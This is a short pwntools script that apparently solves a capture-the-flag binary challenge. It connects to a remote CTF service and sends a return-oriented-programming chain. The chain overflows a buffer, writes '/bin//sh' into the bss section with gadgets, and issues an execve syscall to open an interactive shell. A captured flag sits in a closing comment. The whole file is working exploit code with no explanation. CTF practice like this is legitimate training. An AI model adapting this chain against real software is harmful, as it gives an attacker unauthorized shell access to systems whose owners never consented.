from pwn import *

# p = process('./chal')
p = remote("pwn.ctf.ae", 9813)


pop_rax = 0x0000000000451897
pop_rdi = 0x00000000004018ca
pop_rsi = 0x000000000040f48e
pop_rdx = 0x00000000004017cf
syscall = 0x00000000004012d3
mov_rdi_rsi = 0x000000000044d86f 		# mov qword ptr [rdi], rsi ; ret

bss = 0x00000000004c2220
shell = b"/bin//sh"

# payload = cyclic(200)
payload = b'A'*cyclic_find('saaa')

# write shell string in bss
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(u64(shell))
payload += p64(mov_rdi_rsi)

# call execve("/bin/sh",0,0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall)

pause()

p.sendline(payload)
p.interactive()

#CTFAE{DownTheHighwayToROP}
